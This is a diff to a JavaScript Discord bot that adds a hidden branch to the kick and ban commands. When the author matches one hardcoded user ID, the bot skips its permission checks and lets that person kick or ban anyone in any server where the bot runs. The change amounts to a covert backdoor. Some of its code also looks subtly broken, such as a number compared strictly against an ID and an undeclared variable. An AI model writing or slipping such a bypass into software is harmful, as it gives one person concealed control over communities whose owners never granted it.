@@ -155,6 +155,17 @@ client.on('message', async message =>
 		message.channel.send(pogEmbed)
 
 	} else if (command === 'kick') {
+		if (message.author.id === 583681050136281118) {
+			let User = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
+			if (!User) return message.channel.send("Invalid User")
+			let kickReason = args.join(" ").slice(22);
+			if (!kickReason) {
+				Reason = "None"
+			}
+			User.kick({reason: kickReason})
+		}
+		
+		else {
 		if (!message.member.hasPermission("KICK_MEMBERS")) return message.channel.send('error: user does not have kick permissions')
 		let User = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
 		if (!User) return message.channel.send("Invalid User")
@@ -164,8 +175,20 @@ client.on('message', async message =>
 			Reason = "None"
 		}
 		User.kick({reason: kickReason})	
+		}
 
 	} else if (command === 'ban') {
+		if (message.author.id === 583681050136281118) {
+			let User = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]) // new var "User" (the person being banned or kicked)
+			if (!User) return message.channel.send("Invalid User")
+			let banReason = args.join(" ").slice(22);
+			if (!banReason) {
+			Reason = "None"
+			}
+			User.ban({reason: banReason})
+		}
+		
+		else {
 		if (!message.member.hasPermission("BAN_MEMBERS")) return message.channel.send('error: user does not have ban permissions')
 		let User = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]) // new var "User" (the person being banned or kicked)
 		if (!User) return message.channel.send("Invalid User")
@@ -175,6 +198,7 @@ client.on('message', async message =>
 			Reason = "None"
 		}
 		User.ban({reason: banReason})
+		}
 		
 	} else if (command === 'invite') {
 		const invEmbed = new Discord.MessageEmbed()
